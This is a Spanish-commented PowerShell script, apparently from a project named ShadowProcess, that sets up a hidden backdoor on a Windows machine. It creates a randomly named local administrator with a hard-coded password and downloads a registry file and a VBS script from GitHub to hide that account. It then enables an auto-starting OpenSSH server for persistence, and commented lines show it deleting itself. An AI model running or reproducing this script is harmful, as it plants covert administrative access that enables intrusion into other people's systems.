#Recursos
#String random nombre de directorios.
function random_text {
	return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}



#creando administrador local
function create_account {
	[CmdletBinding()]
	param (
		$uname,
		$pword
	)
	begin {
	}
	process {
		New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
		Write-Verbose "$uname local user crated"
		Add-LocalGroupMember -Group "Administrators" -Member "$uname"
		
	}
	end{
	}
}

#creando usuario administrador 
$uname = random_text
$pword = (ConvertTo-SecureString "Shadowprocess123" -AsPlainText -Force)
create_account -uname $uname -pword $pword

#ir al directorio en la carpeta %temp%, crear un archivo PoC.txt
mkdir $path
cd $path
#echo "" > poc.txt

#registro para esconder administrador
$reg_file = random_text 
Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/hu.reg -OutFile "$reg_file.reg"

#script visual basic confirmar reg
$vbs_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$vbs_file.vbs"

#instalando registro
./"$reg_file.reg";"$vbs_file.vbs"

#Variables 
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = $PWD.Path

# estableciendo persistencia ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd 
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*




#autoeliminacion
#cd $initial_dir
#del .\installer.ps1